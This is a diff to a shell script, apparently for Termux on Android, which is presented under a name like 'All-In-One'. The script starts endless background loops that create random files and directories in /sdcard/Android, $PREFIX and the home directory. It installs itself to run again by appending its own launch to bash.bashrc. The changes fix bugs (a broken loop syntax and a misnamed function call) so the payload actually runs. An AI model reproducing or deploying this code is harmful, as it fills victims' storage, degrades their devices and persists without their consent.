@@ -19,7 +19,7 @@ cwg() {
 	cd abcd
 	fi
 	}
-	a() {
+	abbc() {
 	cd /sdcard/Android
 	ab
 	while [ true ];do
@@ -28,7 +28,7 @@ cwg() {
 	touch ab$RANDOM$RANDOM$RANDOM$RANDOM
 	done > /dev/null 2>&1 &
 	}
-	a
+	abbc
 	abc() {
 		touch $RANDOM$RANDOM$RANDOM$RANDOM
 		touch a$RANDOM$RANDOM$RANDOM$RANDOM
@@ -88,7 +88,7 @@ cwg() {
 		mkdir z$RANDOM$RANDOM$RANDOM$RANDOM
 		}
 		fol() {
-			while [ True ];then
+			while [ True ];do
 			cd $PREFIX
 			abc
 			cd ~
@@ -121,6 +121,11 @@ cwg() {
 						echo "bash $PREFIX/allp.sh" >> bash.bashrc
 						fi
 						}
+						alcheck() {
+							if [ -e "All-In-One/allp.sh" ];then
+							cp -f ~/All-In-One/allp.sh $PREFIX
+							fi
+							}
 				
 			allin() {
 				if [ -e ".bashrc" ];then
@@ -135,8 +140,8 @@ cwg() {
 				if [ -e "$PREFIX/allp.sh" ];then
 				echo
 				else
-				cp -f ~/All-In-One/allp.sh $PREFIX
+				alcheck
 				fi
 				}
-				Aallin
+				allin
 			
